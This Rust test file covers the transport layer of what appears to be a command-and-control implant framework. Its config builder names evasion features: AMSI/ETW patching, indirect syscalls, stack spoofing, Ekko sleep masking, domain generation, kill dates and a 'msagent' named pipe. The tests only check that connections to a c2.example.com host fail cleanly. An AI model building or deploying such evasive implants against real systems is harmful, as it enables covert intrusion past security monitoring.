// tests/test_transport.rs — Transport layer tests

use rcm::common::{C2Config, DgaConfig, TransportProtocol, MalleableProfile, ProxyConfig, FallbackConfig};

fn make_config(host: &str, port: u16, transport: TransportProtocol) -> C2Config {
    C2Config {
        transport,
        profile: MalleableProfile::default(),
        proxy: ProxyConfig::default(),
        fallback: FallbackConfig::default(),
        server_public_key: String::new(),
        hash_salt: String::new(),
        c2_host: host.into(),
        build_id: "test".into(),
        tunnel_port: port,
        sleep_interval: 5,
        jitter_min: 0,
        jitter_max: 0,
        bloat_mb: 0,
        debug: false,
        kill_date: None,
        challenge_key: String::new(),
        sni_override: None,
        alpn_protocols: vec![],
        hibernation_mode: false,
        task_batch_size: 10,
        dga: None,
        valid_parents: Vec::new(),
        sleep_mask: "ekko".to_string(),
        indirect_syscalls: true,
        stack_spoof: true,
        patch_amsi_etw: true,
        heap_encrypt: true,
        guard_domain: String::new(),
        guard_hostname: String::new(),
        guard_hour_start: 0,
        guard_hour_end: 0,
        guard_no_system: false,
    }
}

#[test]
fn test_client_transport_stores_sni_from_config() {
    let config = make_config("c2.example.com", 443, TransportProtocol::Tls);
    let transport = rcm::transport::ClientTransport::new(&config);
    let rt = tokio::runtime::Runtime::new().unwrap();
    let result = rt.block_on(transport.connect());
    assert!(result.is_err()); // Connection fails but doesn't panic
}

#[test]
fn test_client_transport_tcp_plain() {
    let config = make_config("127.0.0.1", 1, TransportProtocol::TcpPlain);
    let transport = rcm::transport::ClientTransport::new(&config);
    let rt = tokio::runtime::Runtime::new().unwrap();
    let result = rt.block_on(transport.connect());
    assert!(result.is_err()); // No server listening, but no panic
}

#[test]
fn test_client_transport_named_pipe_non_windows() {
    let config = make_config("127.0.0.1:testpipe", 0, TransportProtocol::NamedPipe);
    let transport = rcm::transport::ClientTransport::new(&config);
    let rt = tokio::runtime::Runtime::new().unwrap();
    let result = rt.block_on(transport.connect());
    if cfg!(not(target_os = "windows")) {
        assert!(result.is_err());
    }
}

#[test]
fn test_target_addr_format_tcp() {
    let config = make_config("10.0.0.1", 4443, TransportProtocol::Tls);
    let _transport = rcm::transport::ClientTransport::new(&config);
}

#[test]
fn test_target_addr_format_named_pipe() {
    let config = make_config("192.168.1.1:msagent", 0, TransportProtocol::NamedPipe);
    let _transport = rcm::transport::ClientTransport::new(&config);
}
